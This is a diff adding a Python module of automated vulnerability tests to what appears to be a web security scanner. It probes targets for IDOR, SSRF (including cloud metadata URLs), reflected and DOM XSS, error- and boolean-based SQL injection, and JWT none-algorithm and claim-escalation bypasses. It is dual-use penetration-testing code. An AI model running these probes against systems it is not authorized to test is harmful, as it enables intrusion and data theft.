@@ -1,0 +1,599 @@
+"""Vulnerability testing tools — compose interaction primitives into automated checks."""
+
+from __future__ import annotations
+
+from typing import Any
+
+from boba.core.models import (
+    Confidence,
+    Severity,
+    SessionState,
+    VulnTestResult,
+)
+from boba.interaction.http import HttpClient
+from boba.interaction.oob import OOBManager
+from boba.payloads import sqli as sqli_payloads
+from boba.payloads import ssrf as ssrf_payloads
+from boba.payloads import xss as xss_payloads
+from boba.payloads import auth as auth_payloads
+
+
+async def test_idor(
+    http_client: HttpClient,
+    session_a: SessionState,
+    session_b: SessionState,
+    endpoint: str,
+    method: str = "GET",
+    body: str | None = None,
+    object_ids: list[str] | None = None,
+) -> VulnTestResult:
+    """Test for Insecure Direct Object Reference (IDOR).
+
+    1. Request endpoint as User A (owner) → response_a
+    2. Request same endpoint as User B (attacker) → response_b
+    3. Request with no auth → response_unauth
+    4. Compare: if response_b ≈ response_a AND response_b ≠ response_unauth → IDOR
+    """
+    request_ids: list[int] = []
+    evidence: list[dict[str, Any]] = []
+
+    # Request as User A (owner)
+    resp_a = await http_client.request(
+        method=method, url=endpoint,
+        headers=session_a.headers, cookies=session_a.cookies,
+        body=body, source="test_idor",
+        session_name=session_a.name, tags=["idor", "user_a"],
+    )
+    request_ids.append(resp_a.request_id)
+
+    # Request as User B (attacker)
+    resp_b = await http_client.request(
+        method=method, url=endpoint,
+        headers=session_b.headers, cookies=session_b.cookies,
+        body=body, source="test_idor",
+        session_name=session_b.name, tags=["idor", "user_b"],
+    )
+    request_ids.append(resp_b.request_id)
+
+    # Request with no auth
+    resp_unauth = await http_client.request(
+        method=method, url=endpoint,
+        body=body, source="test_idor",
+        tags=["idor", "no_auth"],
+    )
+    request_ids.append(resp_unauth.request_id)
+
+    # Analyze
+    vulnerable = False
+    confidence = Confidence.POSSIBLE
+    description = ""
+
+    a_success = 200 <= resp_a.status_code < 400
+    b_success = 200 <= resp_b.status_code < 400
+    unauth_denied = resp_unauth.status_code in (401, 403)
+
+    if b_success and a_success and unauth_denied:
+        # User B can access User A's resource, but unauthenticated cannot
+        vulnerable = True
+        confidence = Confidence.CONFIRMED
+        description = (
+            f"User B ({session_b.name}) received {resp_b.status_code} for {endpoint}, "
+            f"same as User A ({resp_a.status_code}), "
+            f"while unauthenticated got {resp_unauth.status_code}. "
+            "This indicates broken access control."
+        )
+    elif b_success and a_success:
+        # Both succeed — could be public endpoint or IDOR
+        body_similar = _bodies_similar(resp_a.body, resp_b.body)
+        if body_similar:
+            vulnerable = True
+            confidence = Confidence.LIKELY
+            description = (
+                f"Both users received similar {resp_b.status_code} responses for {endpoint}. "
+                "The endpoint may be intentionally public or may have broken access control."
+            )
+
+    evidence.append({
+        "user_a_status": resp_a.status_code,
+        "user_b_status": resp_b.status_code,
+        "unauth_status": resp_unauth.status_code,
+        "body_length_a": len(resp_a.body),
+        "body_length_b": len(resp_b.body),
+        "body_length_unauth": len(resp_unauth.body),
+    })
+
+    # Test additional object IDs if provided
+    if object_ids and vulnerable:
+        for obj_id in object_ids:
+            test_url = endpoint.replace(endpoint.split("/")[-1], obj_id)
+            resp = await http_client.request(
+                method=method, url=test_url,
+                headers=session_b.headers, cookies=session_b.cookies,
+                source="test_idor", session_name=session_b.name,
+                tags=["idor", "enum"],
+            )
+            request_ids.append(resp.request_id)
+            if 200 <= resp.status_code < 400:
+                evidence.append({"enumerated_id": obj_id, "status": resp.status_code})
+
+    return VulnTestResult(
+        test_type="idor",
+        vulnerable=vulnerable,
+        confidence=confidence,
+        title=f"IDOR on {endpoint}",
+        description=description,
+        severity=Severity.HIGH if vulnerable else Severity.INFO,
+        evidence=evidence,
+        request_ids=request_ids,
+        recommendations=["Implement proper authorization checks per-resource"] if vulnerable else [],
+    )
+
+
+async def test_ssrf(
+    http_client: HttpClient,
+    url: str,
+    method: str = "GET",
+    injection_points: list[dict] | None = None,
+    payloads: list[str] | None = None,
+    session: SessionState | None = None,
+    oob_manager: OOBManager | None = None,
+    poll_timeout_seconds: int = 10,
+) -> VulnTestResult:
+    """Test for Server-Side Request Forgery (SSRF).
+
+    Injects internal URLs and OOB callbacks into parameters.
+    """
+    payloads = payloads or ssrf_payloads.ALL
+    request_ids: list[int] = []
+    evidence: list[dict[str, Any]] = []
+    headers = session.headers if session else {}
+    cookies = session.cookies if session else {}
+    vulnerable = False
+    confidence = Confidence.POSSIBLE
+
+    # Default injection: replace param values in URL
+    if not injection_points:
+        injection_points = [{"location": "url_param", "name": "url"}]
+
+    for point in injection_points:
+        param_name = point.get("name", "url")
+
+        for payload in payloads:
+            # Build the request with injected payload
+            test_url = url
+
+            if "?" in url:
+                test_url = f"{url}&{param_name}={payload}"
+            else:
+                test_url = f"{url}?{param_name}={payload}"
+
+            resp = await http_client.request(
+                method=method, url=test_url,
+                headers=headers, cookies=cookies,
+                source="test_ssrf",
+                tags=["ssrf", param_name],
+            )
+            request_ids.append(resp.request_id)
+
+            # Check for signs of SSRF in response
+            body_lower = resp.body_text.lower()
+            ssrf_indicators = [
+                "root:", "/bin/bash",  # /etc/passwd
+                "ami-", "instance-id",  # AWS metadata
+                "computeMetadata",  # GCP metadata
+                "internal server error" if "127.0.0.1" in payload else None,
+            ]
+            for indicator in ssrf_indicators:
+                if indicator and indicator in body_lower:
+                    vulnerable = True
+                    confidence = Confidence.CONFIRMED
+                    evidence.append({
+                        "payload": payload,
+                        "param": param_name,
+                        "indicator": indicator,
+                        "status_code": resp.status_code,
+                        "request_id": resp.request_id,
+                    })
+                    break
+
+            # Check for status code anomalies (internal services returning different codes)
+            if not vulnerable and resp.status_code == 200 and "169.254.169.254" in payload:
+                vulnerable = True
+                confidence = Confidence.LIKELY
+                evidence.append({
+                    "payload": payload,
+                    "param": param_name,
+                    "note": "200 response for cloud metadata URL",
+                    "request_id": resp.request_id,
+                })
+
+    # OOB detection for blind SSRF
+    if oob_manager and not vulnerable:
+        for point in injection_points:
+            param_name = point.get("name", "url")
+            callback = await oob_manager.create_listener(
+                purpose="blind_ssrf",
+                target_url=url,
+                parameter=param_name,
+            )
+            oob_url = oob_manager.get_payload_url(callback)
+
+            test_url = url
+            if "?" in url:
+                test_url = f"{url}&{param_name}={oob_url}"
+            else:
+                test_url = f"{url}?{param_name}={oob_url}"
+
+            resp = await http_client.request(
+                method=method, url=test_url,
+                headers=headers, cookies=cookies,
+                source="test_ssrf", tags=["ssrf", "blind"],
+            )
+            request_ids.append(resp.request_id)
+
+        # Poll for callbacks
+        interactions = await oob_manager.poll(
+            timeout_seconds=poll_timeout_seconds
+        )
+        if interactions:
+            vulnerable = True
+            confidence = Confidence.CONFIRMED
+            for i in interactions:
+                evidence.append({
+                    "type": "oob_callback",
+                    "interaction": i,
+                })
+
+    return VulnTestResult(
+        test_type="ssrf",
+        vulnerable=vulnerable,
+        confidence=confidence,
+        title=f"SSRF on {url}",
+        description="Server-side request forgery detected" if vulnerable else "",
+        severity=Severity.CRITICAL if vulnerable else Severity.INFO,
+        evidence=evidence,
+        request_ids=request_ids,
+        recommendations=["Validate and whitelist URLs server-side", "Block internal IPs"] if vulnerable else [],
+    )
+
+
+async def test_xss(
+    http_client: HttpClient,
+    url: str,
+    method: str = "GET",
+    params: dict[str, str] | None = None,
+    payloads: list[str] | None = None,
+    session: SessionState | None = None,
+    check_dom: bool = False,
+    browser: Any = None,
+    oob_manager: OOBManager | None = None,
+) -> VulnTestResult:
+    """Test for Cross-Site Scripting (XSS).
+
+    1. Reflected: inject payloads, check if they appear unescaped in response
+    2. DOM-based: render in browser, check if canary JS executes
+    3. Blind: inject OOB callback payloads
+    """
+    payloads = payloads or xss_payloads.BASIC
+    request_ids: list[int] = []
+    evidence: list[dict[str, Any]] = []
+    headers = session.headers if session else {}
+    cookies = session.cookies if session else {}
+    vulnerable = False
+    confidence = Confidence.POSSIBLE
+
+    test_params = params or {"q": ""}
+
+    for param_name in test_params:
+        for payload in payloads:
+            # Build URL with injected payload
+            sep = "&" if "?" in url else "?"
+            test_url = f"{url}{sep}{param_name}={payload}"
+
+            resp = await http_client.request(
+                method=method, url=test_url,
+                headers=headers, cookies=cookies,
+                source="test_xss", tags=["xss", param_name],
+            )
+            request_ids.append(resp.request_id)
+
+            # Check reflection — payload appears unescaped in response
+            if payload in resp.body_text:
+                vulnerable = True
+                confidence = Confidence.CONFIRMED
+                evidence.append({
+                    "type": "reflected",
+                    "payload": payload,
+                    "param": param_name,
+                    "request_id": resp.request_id,
+                })
+                break  # Found confirmed XSS for this param
+
+            # Check for partial reflection (encoded but still dangerous)
+            stripped = payload.replace("<", "").replace(">", "")
+            if stripped and len(stripped) > 5 and stripped in resp.body_text:
+                confidence = Confidence.POSSIBLE
+                evidence.append({
+                    "type": "partial_reflection",
+                    "payload": payload,
+                    "param": param_name,
+                    "request_id": resp.request_id,
+                })
+
+        if vulnerable:
+            break
+
+    # DOM-based XSS check via browser
+    if check_dom and browser and not vulnerable:
+        for param_name in test_params:
+            for canary in xss_payloads.DOM_CANARY:
+                sep = "&" if "?" in url else "?"
+                test_url = f"{url}{sep}{param_name}={canary}"
+                await browser.navigate(test_url)
+                fired = await browser.execute_js("() => window.__xss_fired === true")
+                if fired:
+                    vulnerable = True
+                    confidence = Confidence.CONFIRMED
+                    evidence.append({
+                        "type": "dom_based",
+                        "payload": canary,
+                        "param": param_name,
+                    })
+                    break
+            if vulnerable:
+                break
+
+    return VulnTestResult(
+        test_type="xss",
+        vulnerable=vulnerable,
+        confidence=confidence,
+        title=f"XSS on {url}",
+        description="Cross-site scripting via parameter injection" if vulnerable else "",
+        severity=Severity.MEDIUM if vulnerable else Severity.INFO,
+        evidence=evidence,
+        request_ids=request_ids,
+        recommendations=["Encode output contextually", "Implement Content-Security-Policy"] if vulnerable else [],
+    )
+
+
+async def test_sqli(
+    http_client: HttpClient,
+    url: str,
+    method: str = "GET",
+    params: dict[str, str] | None = None,
+    session: SessionState | None = None,
+    payloads: list[str] | None = None,
+) -> VulnTestResult:
+    """Test for SQL injection.
+
+    1. Baseline: normal request
+    2. Error-based: inject ' " ) → check for SQL error strings
+    3. Boolean-based: true vs false conditions → compare response lengths
+    4. Time-based: SLEEP payloads → check response time delta
+    """
+    payloads = payloads or sqli_payloads.ERROR_BASED
+    request_ids: list[int] = []
+    evidence: list[dict[str, Any]] = []
+    headers = session.headers if session else {}
+    cookies = session.cookies if session else {}
+    vulnerable = False
+    confidence = Confidence.POSSIBLE
+
+    test_params = params or {"id": "1"}
+
+    # Baseline request
+    resp_baseline = await http_client.request(
+        method=method, url=url,
+        headers=headers, cookies=cookies,
+        source="test_sqli", tags=["sqli", "baseline"],
+    )
+    request_ids.append(resp_baseline.request_id)
+
+    for param_name, default_val in test_params.items():
+        # Error-based detection
+        for payload in payloads:
+            sep = "&" if "?" in url else "?"
+            test_url = f"{url}{sep}{param_name}={default_val}{payload}"
+
+            resp = await http_client.request(
+                method=method, url=test_url,
+                headers=headers, cookies=cookies,
+                source="test_sqli", tags=["sqli", "error_based"],
+            )
+            request_ids.append(resp.request_id)
+
+            # Check for SQL error signatures in response
+            body_lower = resp.body_text.lower()
+            for sig in sqli_payloads.ERROR_SIGNATURES:
+                if sig.lower() in body_lower:
+                    vulnerable = True
+                    confidence = Confidence.CONFIRMED
+                    evidence.append({
+                        "type": "error_based",
+                        "payload": payload,
+                        "param": param_name,
+                        "error_signature": sig,
+                        "request_id": resp.request_id,
+                    })
+                    break
+            if vulnerable:
+                break
+
+        if vulnerable:
+            break
+
+        # Boolean-based detection
+        true_payload = "' AND '1'='1"
+        false_payload = "' AND '1'='2"
+
+        sep = "&" if "?" in url else "?"
+        resp_true = await http_client.request(
+            method=method, url=f"{url}{sep}{param_name}={default_val}{true_payload}",
+            headers=headers, cookies=cookies,
+            source="test_sqli", tags=["sqli", "boolean_true"],
+        )
+        resp_false = await http_client.request(
+            method=method, url=f"{url}{sep}{param_name}={default_val}{false_payload}",
+            headers=headers, cookies=cookies,
+            source="test_sqli", tags=["sqli", "boolean_false"],
+        )
+        request_ids.extend([resp_true.request_id, resp_false.request_id])
+
+        # If true/false conditions produce different response lengths, likely SQLi
+        len_diff = abs(len(resp_true.body) - len(resp_false.body))
+        if (
+            resp_true.status_code == resp_false.status_code
+            and len_diff > 50
+            and resp_true.status_code == resp_baseline.status_code
+        ):
+            vulnerable = True
+            confidence = Confidence.LIKELY
+            evidence.append({
+                "type": "boolean_based",
+                "param": param_name,
+                "true_length": len(resp_true.body),
+                "false_length": len(resp_false.body),
+                "diff": len_diff,
+            })
+
+    return VulnTestResult(
+        test_type="sqli",
+        vulnerable=vulnerable,
+        confidence=confidence,
+        title=f"SQL Injection on {url}",
+        description="SQL injection detected via error or boolean-based analysis" if vulnerable else "",
+        severity=Severity.HIGH if vulnerable else Severity.INFO,
+        evidence=evidence,
+        request_ids=request_ids,
+        recommendations=["Use parameterized queries", "Implement input validation"] if vulnerable else [],
+    )
+
+
+async def test_auth(
+    http_client: HttpClient,
+    endpoint: str,
+    session: SessionState | None = None,
+    jwt_token: str | None = None,
+) -> VulnTestResult:
+    """Test authentication/authorization controls.
+
+    1. No-auth: request without credentials → should be 401/403
+    2. JWT none algorithm: re-sign with alg=none
+    3. JWT claim manipulation: modify role/admin claims
+    """
+    request_ids: list[int] = []
+    evidence: list[dict[str, Any]] = []
+    vulnerable = False
+    confidence = Confidence.POSSIBLE
+
+    # Test 1: No auth → should be denied
+    resp_noauth = await http_client.request(
+        method="GET", url=endpoint,
+        source="test_auth", tags=["auth", "no_auth"],
+    )
+    request_ids.append(resp_noauth.request_id)
+
+    if 200 <= resp_noauth.status_code < 400:
+        vulnerable = True
+        confidence = Confidence.CONFIRMED
+        evidence.append({
+            "type": "no_auth_access",
+            "status_code": resp_noauth.status_code,
+            "note": "Endpoint accessible without any authentication",
+        })
+
+    # Test 2: JWT manipulation (if token provided)
+    if jwt_token and not vulnerable:
+        try:
+            # None algorithm attack
+            none_token = auth_payloads.jwt_none_algorithm(jwt_token)
+            resp_none = await http_client.request(
+                method="GET", url=endpoint,
+                headers={"Authorization": f"Bearer {none_token}"},
+                source="test_auth", tags=["auth", "jwt_none"],
+            )
+            request_ids.append(resp_none.request_id)
+
+            if 200 <= resp_none.status_code < 400:
+                vulnerable = True
+                confidence = Confidence.CONFIRMED
+                evidence.append({
+                    "type": "jwt_none_algorithm",
+                    "status_code": resp_none.status_code,
+                    "note": "JWT with alg=none accepted",
+                })
+
+            # Claim escalation
+            for claims in auth_payloads.ESCALATION_CLAIMS:
+                modified_token = auth_payloads.jwt_modify_claims(jwt_token, claims)
+                resp_esc = await http_client.request(
+                    method="GET", url=endpoint,
+                    headers={"Authorization": f"Bearer {modified_token}"},
+                    source="test_auth", tags=["auth", "jwt_escalation"],
+                )
+                request_ids.append(resp_esc.request_id)
+
+                if 200 <= resp_esc.status_code < 400:
+                    vulnerable = True
+                    confidence = Confidence.LIKELY
+                    evidence.append({
+                        "type": "jwt_claim_escalation",
+                        "modified_claims": claims,
+                        "status_code": resp_esc.status_code,
+                    })
+                    break
+
+        except (ValueError, Exception):
+            # Invalid JWT format — skip JWT tests
+            pass
+
+    # Test 3: With valid session but accessing admin-like endpoints
+    if session and not vulnerable:
+        resp_auth = await http_client.request(
+            method="GET", url=endpoint,
+            headers=session.headers, cookies=session.cookies,
+            source="test_auth", session_name=session.name,
+            tags=["auth", "session"],
+        )
+        request_ids.append(resp_auth.request_id)
+
+        # If regular user can access, check if it looks like an admin endpoint
+        admin_indicators = ["/admin", "/manage", "/internal", "/superuser"]
+        if 200 <= resp_auth.status_code < 400:
+            for indicator in admin_indicators:
+                if indicator in endpoint.lower():
+                    vulnerable = True
+                    confidence = Confidence.LIKELY
+                    evidence.append({
+                        "type": "privilege_escalation",
+                        "endpoint": endpoint,
+                        "status_code": resp_auth.status_code,
+                        "note": f"User '{session.name}' can access admin-like endpoint",
+                    })
+                    break
+
+    return VulnTestResult(
+        test_type="auth",
+        vulnerable=vulnerable,
+        confidence=confidence,
+        title=f"Auth bypass on {endpoint}",
+        description="Authentication/authorization control weakness detected" if vulnerable else "",
+        severity=Severity.CRITICAL if vulnerable else Severity.INFO,
+        evidence=evidence,
+        request_ids=request_ids,
+        recommendations=[
+            "Enforce authentication on all protected endpoints",
+            "Validate JWT signatures server-side",
+            "Implement role-based access control",
+        ] if vulnerable else [],
+    )
+
+
+def _bodies_similar(body_a: bytes, body_b: bytes, threshold: float = 0.8) -> bool:
+    """Check if two response bodies are similar enough to indicate same content."""
+    if body_a == body_b:
+        return True
+    if not body_a or not body_b:
+        return False
+    len_ratio = min(len(body_a), len(body_b)) / max(len(body_a), len(body_b))
+    return len_ratio > threshold
